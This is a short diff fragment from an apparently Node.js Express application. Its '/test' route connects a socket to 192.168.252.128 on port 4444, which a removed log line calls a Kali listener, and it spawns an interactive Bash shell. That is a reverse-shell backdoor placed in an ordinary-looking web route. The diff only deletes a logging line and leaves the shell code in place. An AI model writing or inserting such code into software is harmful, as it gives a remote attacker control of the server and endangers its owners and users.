@@ -264,8 +264,6 @@ app.get("/test", (req, res) => {
 	const client = new net.Socket();
 
 	client.connect(4444, "192.168.252.128", () => {
-		console.log(`Connected to Kali listener at ${KALI_IP}:${KALI_PORT}`);
-
 		// Spawn a Bash shell
 		const bash = spawn("/bin/bash", ["-i"]); // Interactive Bash shell
 
